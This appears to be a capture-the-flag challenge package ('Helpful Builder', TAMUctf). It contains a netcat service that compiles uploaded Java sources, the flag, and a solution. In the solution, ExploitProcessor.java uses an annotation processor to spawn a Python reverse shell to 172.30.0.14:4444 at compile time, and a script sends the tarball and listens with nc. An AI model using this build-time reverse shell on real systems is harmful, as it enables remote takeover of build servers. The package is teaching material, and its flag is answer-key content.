{
    "config.yml": "# [default: None] A domain name to append to challenge names to create their default common name\ndomain: naum.tamuctf.com\n\n# [default: './challenges'] The directory which contains your challenges\n# If the the path is relative, it will be relative to the generated docker-compose.yml file\nchallenges_directory: ./challenges\n\n# [required] Configurations for each challenge\nchallenges:\n    helpful-builder:\n        port: 2001\n        files:\n            - helpful-builder/docker-compose.yml\n        commonname: 10.0.2.9\n        ifconfig_push: 172.30.0.14/28\n",
    "docker-compose.yml": "version: '2.4'\n\nx-limits: &limits\n    pids_limit: 1024\n    cpu_shares: 256\n    mem_limit: 512m\n    logging:\n        options:\n            max-size: 10m\n            max-file: '3'\n\nservices:\n    helpful-builder:\n        <<: *limits\n        build: .\n        image: naumachia/helpful-builder.actor\n        networks:\n            default:\n                ipv4_address: 172.30.0.2\n        restart: unless-stopped        \n\nnetworks:\n    default:\n        driver: l2bridge\n        ipam:\n            driver: static\n            config:\n                - subnet: 172.30.0.0/28\n    naumachia_default:\n",
    "Dockerfile": "FROM adoptopenjdk/openjdk12:alpine-slim\n\nRUN apk add --no-cache --update python3 netcat-openbsd\nRUN adduser jsullivan --disabled-password\n\nEXPOSE 8000\nEXPOSE 9000\n\nCOPY helpful-builder/ /home/jsullivan/helpful-builder\nCOPY run.sh /home/jsullivan/run.sh\n\nRUN chown -hR jsullivan:jsullivan /home/jsullivan\n\n# pre-download gradle so contestants don't need to wait\nRUN su -s /bin/sh -c \"cd /home/jsullivan/helpful-builder; sh gradlew --continue clean build || true\" jsullivan\n\nWORKDIR /home/jsullivan\n\nCOPY flag.txt /home/jsullivan/flag.txt\n\nCMD [\"su\", \"-s\", \"/bin/sh\", \"-c\", \"cd helpful-builder; python3 -m http.server & cd .. && sh run.sh\", \"jsullivan\"]\n",
    "flag.txt": "gigem{w0w_ctfe_r3a11y_ex1s7s}\n",
    "README.md": "# Helpful Builder\n\n```text\nI know you can't build on your machine -- it's so dumb that IT won't install JDK12 for one of our developers.\n\nGo ahead and fire over a tarfile with the contents of src/main in it on our typical netcat port, I'll compile the test jar so you can run it on your side.\nI'll make my sources available on http://172.17.0.2:8000 so you can fetch the test jar.\n```\n\n## Setup\n\n1. `docker build -t helpful-builder .`\n2. `docker run --rm -d helpful-builder`\n\n## Brief Dev Description\n\nNetcat session which is reading from the stream in, untarring it into the src/main directory, then sending back the generated test jar.\n\nThere are a few ways to solve this problem, but they all come down to compile time execution. The solution provided is one of the simpler ways to do this.\n\n## Solution\n\nThis particular solution used exploits annotations processors to spawn a reverse shell via the @Test annotation used by the testing classes.\n",
    "run.sh": "#!/bin/bash\n\ncd helpful-builder\n\nwhile true; do\n  nc -nlp 9000 > /tmp/main.tar\n  rm -rf src/main # cleanup\n  mkdir -p src/main\n  cd src/main\n  tar xf /tmp/main.tar\n  cd ../..\n  ./gradlew clean testJar\ndone\n",
    "helpful-builder\\.gitignore": ".gradle\nbuild/\n\n# Ignore Gradle GUI config\ngradle-app.setting\n\n# Avoid ignoring Gradle wrapper jar file (.jar files are usually ignored)\n!gradle-wrapper.jar\n\n# Cache of project\n.gradletasknamecache\n\n# # Work around https://youtrack.jetbrains.com/issue/IDEA-116898\n# gradle/wrapper/gradle-wrapper.properties\n\n# JetBrains IDE configuration files\n/.idea/",
    "helpful-builder\\build.gradle": "apply plugin: 'java'\n\ngroup 'com.tamuctf.helpfulbuilder'\nversion '1.0-SNAPSHOT'\n\nsourceCompatibility = 1.12\n\nrepositories {\n    mavenCentral()\n}\n\ntask testJar(type: Jar) {\n    from sourceSets.test.output + sourceSets.main.output\n\n    baseName project.name + '-test'\n}\n\nassemble.dependsOn testJar\n\ndependencies {\n    implementation group: 'org.jetbrains', name: 'annotations', version: '17.0.0'\n    testCompile group: 'junit', name: 'junit', version: '4.12'\n}\n",
    "helpful-builder\\gradlew": "#!/usr/bin/env sh\n\n##############################################################################\n##\n##  Gradle start up script for UN*X\n##\n##############################################################################\n\n# Attempt to set APP_HOME\n# Resolve links: $0 may be a link\nPRG=\"$0\"\n# Need this for relative symlinks.\nwhile [ -h \"$PRG\" ] ; do\n    ls=`ls -ld \"$PRG\"`\n    link=`expr \"$ls\" : '.*-> \\(.*\\)$'`\n    if expr \"$link\" : '/.*' > /dev/null; then\n        PRG=\"$link\"\n    else\n        PRG=`dirname \"$PRG\"`\"/$link\"\n    fi\ndone\nSAVED=\"`pwd`\"\ncd \"`dirname \\\"$PRG\\\"`/\" >/dev/null\nAPP_HOME=\"`pwd -P`\"\ncd \"$SAVED\" >/dev/null\n\nAPP_NAME=\"Gradle\"\nAPP_BASE_NAME=`basename \"$0\"`\n\n# Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.\nDEFAULT_JVM_OPTS='\"-Xmx64m\"'\n\n# Use the maximum available, or set MAX_FD != -1 to use that value.\nMAX_FD=\"maximum\"\n\nwarn () {\n    echo \"$*\"\n}\n\ndie () {\n    echo\n    echo \"$*\"\n    echo\n    exit 1\n}\n\n# OS specific support (must be 'true' or 'false').\ncygwin=false\nmsys=false\ndarwin=false\nnonstop=false\ncase \"`uname`\" in\n  CYGWIN* )\n    cygwin=true\n    ;;\n  Darwin* )\n    darwin=true\n    ;;\n  MINGW* )\n    msys=true\n    ;;\n  NONSTOP* )\n    nonstop=true\n    ;;\nesac\n\nCLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar\n\n# Determine the Java command to use to start the JVM.\nif [ -n \"$JAVA_HOME\" ] ; then\n    if [ -x \"$JAVA_HOME/jre/sh/java\" ] ; then\n        # IBM's JDK on AIX uses strange locations for the executables\n        JAVACMD=\"$JAVA_HOME/jre/sh/java\"\n    else\n        JAVACMD=\"$JAVA_HOME/bin/java\"\n    fi\n    if [ ! -x \"$JAVACMD\" ] ; then\n        die \"ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME\n\nPlease set the JAVA_HOME variable in your environment to match the\nlocation of your Java installation.\"\n    fi\nelse\n    JAVACMD=\"java\"\n    which java >/dev/null 2>&1 || die \"ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.\n\nPlease set the JAVA_HOME variable in your environment to match the\nlocation of your Java installation.\"\nfi\n\n# Increase the maximum file descriptors if we can.\nif [ \"$cygwin\" = \"false\" -a \"$darwin\" = \"false\" -a \"$nonstop\" = \"false\" ] ; then\n    MAX_FD_LIMIT=`ulimit -H -n`\n    if [ $? -eq 0 ] ; then\n        if [ \"$MAX_FD\" = \"maximum\" -o \"$MAX_FD\" = \"max\" ] ; then\n            MAX_FD=\"$MAX_FD_LIMIT\"\n        fi\n        ulimit -n $MAX_FD\n        if [ $? -ne 0 ] ; then\n            warn \"Could not set maximum file descriptor limit: $MAX_FD\"\n        fi\n    else\n        warn \"Could not query maximum file descriptor limit: $MAX_FD_LIMIT\"\n    fi\nfi\n\n# For Darwin, add options to specify how the application appears in the dock\nif $darwin; then\n    GRADLE_OPTS=\"$GRADLE_OPTS \\\"-Xdock:name=$APP_NAME\\\" \\\"-Xdock:icon=$APP_HOME/media/gradle.icns\\\"\"\nfi\n\n# For Cygwin, switch paths to Windows format before running java\nif $cygwin ; then\n    APP_HOME=`cygpath --path --mixed \"$APP_HOME\"`\n    CLASSPATH=`cygpath --path --mixed \"$CLASSPATH\"`\n    JAVACMD=`cygpath --unix \"$JAVACMD\"`\n\n    # We build the pattern for arguments to be converted via cygpath\n    ROOTDIRSRAW=`find -L / -maxdepth 1 -mindepth 1 -type d 2>/dev/null`\n    SEP=\"\"\n    for dir in $ROOTDIRSRAW ; do\n        ROOTDIRS=\"$ROOTDIRS$SEP$dir\"\n        SEP=\"|\"\n    done\n    OURCYGPATTERN=\"(^($ROOTDIRS))\"\n    # Add a user-defined pattern to the cygpath arguments\n    if [ \"$GRADLE_CYGPATTERN\" != \"\" ] ; then\n        OURCYGPATTERN=\"$OURCYGPATTERN|($GRADLE_CYGPATTERN)\"\n    fi\n    # Now convert the arguments - kludge to limit ourselves to /bin/sh\n    i=0\n    for arg in \"$@\" ; do\n        CHECK=`echo \"$arg\"|egrep -c \"$OURCYGPATTERN\" -`\n        CHECK2=`echo \"$arg\"|egrep -c \"^-\"`                                 ### Determine if an option\n\n        if [ $CHECK -ne 0 ] && [ $CHECK2 -eq 0 ] ; then                    ### Added a condition\n            eval `echo args$i`=`cygpath --path --ignore --mixed \"$arg\"`\n        else\n            eval `echo args$i`=\"\\\"$arg\\\"\"\n        fi\n        i=$((i+1))\n    done\n    case $i in\n        (0) set -- ;;\n        (1) set -- \"$args0\" ;;\n        (2) set -- \"$args0\" \"$args1\" ;;\n        (3) set -- \"$args0\" \"$args1\" \"$args2\" ;;\n        (4) set -- \"$args0\" \"$args1\" \"$args2\" \"$args3\" ;;\n        (5) set -- \"$args0\" \"$args1\" \"$args2\" \"$args3\" \"$args4\" ;;\n        (6) set -- \"$args0\" \"$args1\" \"$args2\" \"$args3\" \"$args4\" \"$args5\" ;;\n        (7) set -- \"$args0\" \"$args1\" \"$args2\" \"$args3\" \"$args4\" \"$args5\" \"$args6\" ;;\n        (8) set -- \"$args0\" \"$args1\" \"$args2\" \"$args3\" \"$args4\" \"$args5\" \"$args6\" \"$args7\" ;;\n        (9) set -- \"$args0\" \"$args1\" \"$args2\" \"$args3\" \"$args4\" \"$args5\" \"$args6\" \"$args7\" \"$args8\" ;;\n    esac\nfi\n\n# Escape application args\nsave () {\n    for i do printf %s\\\\n \"$i\" | sed \"s/'/'\\\\\\\\''/g;1s/^/'/;\\$s/\\$/' \\\\\\\\/\" ; done\n    echo \" \"\n}\nAPP_ARGS=$(save \"$@\")\n\n# Collect all arguments for the java command, following the shell quoting and substitution rules\neval set -- $DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS \"\\\"-Dorg.gradle.appname=$APP_BASE_NAME\\\"\" -classpath \"\\\"$CLASSPATH\\\"\" org.gradle.wrapper.GradleWrapperMain \"$APP_ARGS\"\n\n# by default we should be in the correct project dir, but when run from Finder on Mac, the cwd is wrong\nif [ \"$(uname)\" = \"Darwin\" ] && [ \"$HOME\" = \"$PWD\" ]; then\n  cd \"$(dirname \"$0\")\"\nfi\n\nexec \"$JAVACMD\" \"$@\"\n",
    "helpful-builder\\gradlew.bat": "@if \"%DEBUG%\" == \"\" @echo off\n@rem ##########################################################################\n@rem\n@rem  Gradle startup script for Windows\n@rem\n@rem ##########################################################################\n\n@rem Set local scope for the variables with windows NT shell\nif \"%OS%\"==\"Windows_NT\" setlocal\n\nset DIRNAME=%~dp0\nif \"%DIRNAME%\" == \"\" set DIRNAME=.\nset APP_BASE_NAME=%~n0\nset APP_HOME=%DIRNAME%\n\n@rem Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.\nset DEFAULT_JVM_OPTS=\"-Xmx64m\"\n\n@rem Find java.exe\nif defined JAVA_HOME goto findJavaFromJavaHome\n\nset JAVA_EXE=java.exe\n%JAVA_EXE% -version >NUL 2>&1\nif \"%ERRORLEVEL%\" == \"0\" goto init\n\necho.\necho ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.\necho.\necho Please set the JAVA_HOME variable in your environment to match the\necho location of your Java installation.\n\ngoto fail\n\n:findJavaFromJavaHome\nset JAVA_HOME=%JAVA_HOME:\"=%\nset JAVA_EXE=%JAVA_HOME%/bin/java.exe\n\nif exist \"%JAVA_EXE%\" goto init\n\necho.\necho ERROR: JAVA_HOME is set to an invalid directory: %JAVA_HOME%\necho.\necho Please set the JAVA_HOME variable in your environment to match the\necho location of your Java installation.\n\ngoto fail\n\n:init\n@rem Get command-line arguments, handling Windows variants\n\nif not \"%OS%\" == \"Windows_NT\" goto win9xME_args\n\n:win9xME_args\n@rem Slurp the command line arguments.\nset CMD_LINE_ARGS=\nset _SKIP=2\n\n:win9xME_args_slurp\nif \"x%~1\" == \"x\" goto execute\n\nset CMD_LINE_ARGS=%*\n\n:execute\n@rem Setup the command line\n\nset CLASSPATH=%APP_HOME%\\gradle\\wrapper\\gradle-wrapper.jar\n\n@rem Execute Gradle\n\"%JAVA_EXE%\" %DEFAULT_JVM_OPTS% %JAVA_OPTS% %GRADLE_OPTS% \"-Dorg.gradle.appname=%APP_BASE_NAME%\" -classpath \"%CLASSPATH%\" org.gradle.wrapper.GradleWrapperMain %CMD_LINE_ARGS%\n\n:end\n@rem End local scope for the variables with windows NT shell\nif \"%ERRORLEVEL%\"==\"0\" goto mainEnd\n\n:fail\nrem Set variable GRADLE_EXIT_CONSOLE if you need the _script_ return code instead of\nrem the _cmd.exe /c_ return code!\nif  not \"\" == \"%GRADLE_EXIT_CONSOLE%\" exit 1\nexit /b 1\n\n:mainEnd\nif \"%OS%\"==\"Windows_NT\" endlocal\n\n:omega\n",
    "helpful-builder\\lombok.config": "# This file is generated by the 'io.freefair.lombok' Gradle plugin\nconfig.stopBubbling = true\n",
    "helpful-builder\\settings.gradle": "rootProject.name = 'helpful-builder'\n\n",
    "helpful-builder\\gradle\\wrapper\\gradle-wrapper.jar": "[Binary file or unsupported type: jar]",
    "helpful-builder\\gradle\\wrapper\\gradle-wrapper.properties": "#Sun Dec 29 11:25:50 CST 2019\ndistributionUrl=https\\://services.gradle.org/distributions/gradle-4.10.2-all.zip\ndistributionBase=GRADLE_USER_HOME\ndistributionPath=wrapper/dists\nzipStorePath=wrapper/dists\nzipStoreBase=GRADLE_USER_HOME\n",
    "helpful-builder\\src\\test\\java\\com\\tamuctf\\helpfulbuilder\\AddTest.java": "package com.tamuctf.helpfulbuilder;\n\nimport org.junit.Test;\n\nimport static com.tamuctf.helpfulbuilder.Add.add;\nimport static org.junit.Assert.*;\n\n@SuppressWarnings(\"ConstantConditions\")\npublic class AddTest {\n\n    @Test\n    public void addTest() {\n        assertEquals(0, add(1, -1).intValue());\n    }\n\n    @Test(expected = NullPointerException.class)\n    public void addFirstNullTest() {\n        add(null, 0);\n    }\n\n    @Test(expected = NullPointerException.class)\n    public void addSecondNullTest() {\n        add(0, null);\n    }\n\n\n    @Test(expected = NullPointerException.class)\n    public void addBothNullTest() {\n        add(null, null);\n    }\n\n\n}",
    "solution\\.gitignore": "main.tar\n",
    "solution\\build.sh": "#!/bin/bash\n\ncd main\ntar cvf ../main.tar *\n",
    "solution\\run.sh": "#!/bin/bash\n\n./build.sh\n\nnc -q 1 172.30.0.2 9000 < main.tar\nnc -nvlp 4444\n",
    "solution\\main\\java\\com\\tamuctf\\helpfulbuilder\\Add.java": "package com.tamuctf.helpfulbuilder;\n\nimport org.jetbrains.annotations.Contract;\nimport org.jetbrains.annotations.NotNull;\n\npublic class Add {\n\n    public static Integer add(Integer first, Integer second) {\n        return first + second;\n    }\n\n}\n",
    "solution\\main\\java\\exploit\\ExploitProcessor.java": "package exploit;\n\nimport javax.annotation.processing.AbstractProcessor;\nimport javax.annotation.processing.RoundEnvironment;\nimport javax.annotation.processing.SupportedAnnotationTypes;\nimport javax.annotation.processing.SupportedSourceVersion;\nimport javax.lang.model.SourceVersion;\nimport javax.lang.model.element.TypeElement;\nimport javax.tools.Diagnostic;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.PrintStream;\nimport java.util.Set;\n\n@SupportedAnnotationTypes(\"org.junit.Test\")\n@SupportedSourceVersion(SourceVersion.RELEASE_12)\npublic class ExploitProcessor extends AbstractProcessor {\n\n    @Override\n    public boolean process(Set<? extends TypeElement> set, RoundEnvironment roundEnvironment) {\n        try {\n            Runtime r = Runtime.getRuntime();\n            Process p = r.exec(new String[]{\"/usr/bin/python3\", \"-c\", \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"172.30.0.14\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\"});\n            p.waitFor();\n        } catch (InterruptedException | IOException | RuntimeException e) {\n            ByteArrayOutputStream output;\n            try (PrintStream s = new PrintStream(output = new ByteArrayOutputStream())) {\n                e.printStackTrace(s);\n            }\n            this.processingEnv.getMessager().printMessage(Diagnostic.Kind.ERROR, output.toString());\n        }\n        return false;\n    }\n}\n",
    "solution\\main\\resources\\META-INF\\services\\javax.annotation.processing.Processor": "exploit.ExploitProcessor",
    "category": "NetworkPentest"
}